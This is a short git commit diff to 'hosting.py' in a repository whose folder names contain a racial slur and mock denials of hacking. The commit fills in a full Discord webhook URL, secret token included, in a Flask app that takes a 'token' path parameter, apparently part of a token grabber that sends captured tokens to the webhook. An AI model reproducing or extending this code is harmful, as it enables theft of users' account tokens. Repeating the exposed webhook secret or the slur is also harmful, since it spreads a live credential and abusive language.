00e46f9391e7567e339f508786d9c1b570407148
Normie321 <152443547+Normie321@users.noreply.github.com>
2025-11-11 22:26:33 -0500

    Update hosting.py

--- idonthackniggaspromise/thiswontstealyourinfo/hosting.py
+++ idonthackniggaspromise/thiswontstealyourinfo/hosting.py
@@ -1,6 +1,6 @@
 from dhooks import Webhook
 from flask import Flask, redirect
-e = "PASTE_WEBHOOK_HERE"
+e = "https://discord.com/api/webhooks/1438006724714958868/jsBVkOjC9WYdX8H2_lzGO5ydXOAhVbwZVun-Te36YWtvY5w4ZzNsICvXSWpsd3Y-ek_2"
 app = Flask(__name__)
 hook = Webhook(e)
 @app.route('/<string:token>')
